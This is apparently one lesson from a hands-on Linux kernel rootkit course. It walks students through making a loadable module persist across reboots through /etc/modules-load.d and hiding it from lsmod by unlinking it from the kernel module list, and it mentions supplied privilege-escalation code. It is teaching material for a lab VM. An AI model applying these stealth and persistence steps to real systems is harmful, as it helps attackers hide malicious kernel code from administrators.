# M00: Persist Across Reboot and Hide from `lsmod`

## Mission

L09 gave the module a command table, but it disappears on reboot and anyone can
find it with `lsmod`.
Two problems, two mechanisms: write a boot configuration file so the module
reloads automatically, and remove its list entry so `lsmod` no longer shows it.

## What you will observe

```console
root@victim:~# insmod /rklings/rklings.ko
root@victim:~# mkdir rklings.persist
root@victim:~# cat /etc/modules-load.d/rklings.conf
rklings
root@victim:~# mkdir rklings.h.m
root@victim:~# lsmod | grep rklings
root@victim:~# mkdir rklings.ping
mkdir: File exists
```

Empty `lsmod` output proves the module is hidden.
The `mkdir rklings.ping` error proves it is still running.

## Workspace

```text
exercises/M00-persistence-stealth
├── Kbuild
├── core
│   ├── cred.c          (supplied: PID escalation)
│   ├── dispatch.c      (supplied: command registry and kretprobes)
│   ├── init.c          (supplied: lifecycle, ping, status)
│   └── module.c        (editable)
└── include
    └── rootkit.h       (supplied: types, macros, declarations)
```

Only `core/module.c` is editable.

## Boot persistence

`systemd-modules-load` reads every `.conf` file in `/etc/modules-load.d/` at
boot and loads each named module:

```text
/etc/modules-load.d/rklings.conf     reboot     modprobe rklings
         |                              |              |
         v                              v              v
    "rklings\n"                   systemd reads   module loaded
```

The exercise writes and clears that file from module context.
The validator installs the `.ko` and runs `depmod`; the student owns only the
configuration file.

## Module-list hiding

The kernel tracks loaded modules in a doubly-linked list.
`lsmod` iterates that list, so removing the node hides the module:

```text
before list_del              after list_del

... <-> [prev] <-> [rklings] <-> [next] <-> ...
                       |
                  save prev
                       |
                       v
... <-> [prev] <------------------> [next] <-> ...
         ^
     saved_prev              rklings still runs
```

`list_add(&THIS_MODULE->list, saved_prev)` restores the node.
`saved_prev` doubles as a state flag: non-NULL means hidden, so both operations
are idempotent.
`init.c` calls `rk_module_unhide()` during exit so `rmmod` can find the module.

## TODOs

```text
TODO 1  core/module.c:14:2  hide the module from the published list
TODO 2  core/module.c:19:2  restore the module in the published list
TODO 3  core/module.c:26:2  write the module name to PERSIST_PATH
TODO 4  core/module.c:32:2  clear PERSIST_PATH
```

### TODO 1 -- `core/module.c:14:2` -- Hide the module

If `saved_prev` is already set, return immediately.
Save `THIS_MODULE->list.prev`, then call `list_del` on `THIS_MODULE->list`.

### TODO 2 -- `core/module.c:19:2` -- Restore the module

If `saved_prev` is NULL, return immediately.
Call `list_add` to insert `THIS_MODULE->list` after `saved_prev`, then set
`saved_prev` to NULL.

### TODO 3 -- `core/module.c:26:2` -- Write the module name

Three kernel functions handle file I/O: `filp_open` opens a path and returns a
`struct file *` (or an error pointer), `kernel_write` writes bytes,
`filp_close` releases the file.

1. Open `PERSIST_PATH` with `O_WRONLY | O_CREAT | O_TRUNC`, mode `0644`.
2. If the open fails, return the error with `PTR_ERR`.
3. Write `MODULE_NAME_STR "\n"` with length `sizeof(MODULE_NAME_STR)`.
   `sizeof("rklings")` is 8 (7 chars + NUL), matching `"rklings\n"` (7 +
   newline).
4. Close the file and return `0`.

### TODO 4 -- `core/module.c:32:2` -- Clear the persistence file

Same open pattern as TODO 3.
Write zero bytes, close, and return `0`.

## Test it

From the host:

```console
$ ./rklings run M00
```

Inside the guest:

```console
root@victim:~# insmod /rklings/rklings.ko
root@victim:~# install -D -m 0644 /rklings/rklings.ko \
  /lib/modules/$(uname -r)/extra/rklings.ko
root@victim:~# depmod -a
root@victim:~# mkdir rklings.persist
root@victim:~# cat /etc/modules-load.d/rklings.conf
rklings
root@victim:~# mkdir rklings.h.m
root@victim:~# lsmod | grep rklings
root@victim:~# mkdir rklings.u.m
root@victim:~# lsmod | grep rklings
rklings  16384  0
root@victim:~# mkdir rklings.unpersist
root@victim:~# cat /etc/modules-load.d/rklings.conf
```

## Validate

```console
$ ./rklings validate M00
```

Validation proves: persist writes the configuration file; the module loads after
a real reboot; unpersist clears it; the module stays absent after a second
reboot; hide removes it from `lsmod` while it keeps running; unhide restores it;
repeated hide/unhide do not corrupt the list; escalation and dispatcher still
work.

## Next

The module survives reboot and disappears from `lsmod`, but files, processes,
and ports remain visible.
L10 builds a target list that later lessons use to hide specific items from
directory listings.
